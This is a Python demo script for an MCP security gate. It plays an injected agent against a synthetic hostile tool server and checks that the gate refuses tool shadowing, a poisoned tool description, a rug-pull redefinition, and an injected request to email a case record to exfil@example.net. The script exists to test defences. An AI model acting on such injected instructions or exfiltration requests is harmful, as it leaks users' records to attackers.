#!/usr/bin/env python3
"""Put the MCP gate in front of a hostile tool server and play an injected agent.

Scan, lock, then serve: the script drives the real gate process over MCP stdio,
exactly as an MCP host would, and prints each decision. Everything is synthetic.

    python scripts/mcp_gate_demo.py --output work/mcp-demo
"""
import argparse
import json
import shutil
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from fssaira.integration.mcp_gate import (  # noqa: E402
    GateConfig,
    Upstream,
    UpstreamSpec,
    lock,
    scan,
    verify_receipts,
    write_json,
)

EXAMPLE = ROOT / "examples" / "mcp"


def text_of(result):
    return " ".join(part.get("text", "") for part in result.get("content") or [])


def run(output: Path) -> dict:
    output.mkdir(parents=True, exist_ok=True)
    for name in ("hostile_server.py", "gate.yaml"):
        shutil.copy(EXAMPLE / name, output / name)
    config = GateConfig.load(output / "gate.yaml")

    survey = scan(config)
    write_json(survey, output / "scan.json")
    locked = lock(config, approved_by="Synthetic Reviewer")
    write_json(locked, output / "mcp.lock.json")
    receipts = output / "receipts.jsonl"
    receipts.unlink(missing_ok=True)

    gate = Upstream(UpstreamSpec(name="gate", operator="demo", command=(
        sys.executable, "-m", "fssaira.cli", "mcp", "serve", "--config", str(output / "gate.yaml"),
        "--lock", str(output / "mcp.lock.json"), "--receipts", str(receipts)),
        env={"PYTHONPATH": str(ROOT / "src")}), base=output, timeout=30)
    steps = []

    def step(label, wire, arguments, expect):
        result = gate.call_tool(wire, arguments)
        refused = bool(result.get("isError"))
        code = text_of(result).split(": ", 1)[-1].split(".", 1)[0] if refused else "AUTHORISED"
        ok = (expect == "allow") != refused
        steps.append({"step": label, "tool": wire, "decision": "deny" if refused else "allow",
                      "code": code, "as_expected": ok})
        mark = "✓" if ok else "✗ UNEXPECTED"
        print(f"  {mark} {label:<58} {'REFUSED ' + code if refused else 'allowed'}")
        return result

    try:
        gate.initialize()
        offered = [t["name"] for t in gate.list_tools()]
        print(f"scan: {survey['tools']} tools, {survey['flagged_tools']} flagged "
              f"(instruction hidden in a parameter description)")
        print(f"lock: {sum(len(s['tools']) for s in locked['servers'])} approved by a named human, "
              f"{len(locked['excluded'])} excluded")
        print(f"gate offers: {', '.join(offered)}\n")
        step("1. bare name, the shadowing attack", "send_email", {"to": "x", "body": "x"}, "deny")
        step("2. poisoned tool that was never approved", "casework__format_notes", {"notes": "a"}, "deny")
        step("3. read a trusted case record", "casework__lookup_case", {"case_id": "C-7"}, "allow")
        step("4. privileged send while the session is trusted", "casework__send_email",
             {"to": "caseworker@example.org", "body": "status open"}, "allow")
        page = step("5. fetch a web page (injection + sampling request)", "casework__fetch_page",
                    {"url": "https://news.example"}, "allow")
        print(f"       page says: {text_of(page)[40:120]}...")
        step("6. the injection's ask: email the record out", "casework__send_email",
             {"to": "exfil@example.net", "body": "case record"}, "deny")
        step("7. lookup_case after the server redefined it (rug pull)", "casework__lookup_case",
             {"case_id": "C-7"}, "deny")
        after = [t["name"] for t in gate.list_tools()]
        print(f"\ngate now offers: {', '.join(after)}")
    finally:
        gate.close()

    audit = verify_receipts(receipts)
    print(f"receipts: {audit['receipts']} hash-chained, verified={audit['verified']}; "
          f"{json.dumps(audit['decisions'])}")
    report = {"steps": steps, "offered_before": offered, "offered_after": after,
              "receipts": audit, "all_as_expected": all(s["as_expected"] for s in steps)}
    write_json(report, output / "report.json")
    return report


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--output", type=Path, default=ROOT / "work" / "mcp-demo")
    report = run(parser.parse_args().output)
    return 0 if report["all_as_expected"] and report["receipts"]["verified"] else 1


if __name__ == "__main__":
    raise SystemExit(main())
